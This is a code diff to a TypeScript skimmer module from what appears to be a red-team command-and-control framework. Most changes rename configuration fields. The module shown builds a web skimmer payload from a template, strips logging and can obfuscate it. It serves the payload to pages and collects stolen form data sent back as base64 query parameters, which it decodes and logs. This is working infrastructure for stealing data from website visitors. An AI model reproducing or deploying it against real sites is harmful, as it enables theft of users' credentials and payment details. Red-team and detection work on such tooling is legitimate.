@@ -5,7 +5,7 @@ import Logger from "../lib/logger";
 
 import { emsg } from "../utils";
 import { Module } from "./base";
-import { RedChannelConfig } from "../lib/config";
+import { RedChannelConfig } from "../pb/c2";
 
 const SKIMMER_PAYLOAD_TEMPLATE_PATH = "payloads/skimmer.js";
 
@@ -75,7 +75,8 @@ export default class SkimmerModule implements Module {
     }
 
     execute(): void {
-        if (!this.config.skimmer.url) throw new Error("skimmer url is required, see 'help'");
+        if (!this.config.skimmer) throw new Error("skimmer config is required");
+        if (!this.config.skimmer?.url) throw new Error("skimmer url is required");
 
         let data: Buffer;
         let skimmerJs = "";
@@ -86,10 +87,10 @@ export default class SkimmerModule implements Module {
             throw new Error(`failed to generate payload: ${emsg(ex)}`);
         }
 
-        const targetClasses = "['" + this.config.skimmer.target_classes.join("','") + "']";
-        const targetIds = "['" + this.config.skimmer.target_ids.join("','") + "']";
+        const targetClasses = "['" + this.config.skimmer.targetClasses.join("','") + "']";
+        const targetIds = "['" + this.config.skimmer.targetIds.join("','") + "']";
         const targetUrl = this.config.skimmer.url;
-        const targetDataRoute = this.config.skimmer.data_route;
+        const targetDataRoute = this.config.skimmer.dataRoute;
 
         skimmerJs = skimmerJs.replace(/\[SKIMMER_URL\]/, targetUrl);
         skimmerJs = skimmerJs.replace(/\[SKIMMER_DATA_ROUTE\]/, targetDataRoute);
@@ -98,7 +99,7 @@ export default class SkimmerModule implements Module {
         skimmerJs = skimmerJs.replace(/\s+console\.log\(.+;/g, "");
 
         this.payload = skimmerJs;
-        if (this.config.skimmer.obfuscate_payload) {
+        if (this.config.skimmer.obfuscatePayload) {
             let obfs: ObfuscationResult;
             try {
                 obfs = obfuscate(skimmerJs, {
@@ -117,7 +118,7 @@ export default class SkimmerModule implements Module {
             }
         }
 
-        this.log.info(`skimmer payload set to: \n${this.payload}`);
+        this.log.info(`skimmer payload set to:\n${this.payload}`);
     }
 
     dataRouteHandler(request: Request, response: Response) {
@@ -126,13 +127,14 @@ export default class SkimmerModule implements Module {
         if (request.query?.id) {
             const skimmerId = request.query.id as string;
             const decodedData = Buffer.from(skimmerId, "base64").toString();
-            this.log.success(`incoming skimmer data:\n${decodedData}`);
+            this.log.info(`incoming skimmer data:\n${decodedData}`);
         } else {
             this.log.warn(`incoming skimmer data did not have an id`);
         }
 
         response.send();
     }
+
     payloadRouteHandler(request: Request, response: Response) {
         const ip = request.headers["x-forwarded-for"] || request.socket.remoteAddress;
         this.log.warn(`incoming request for skimmer payload from ${ip}`);
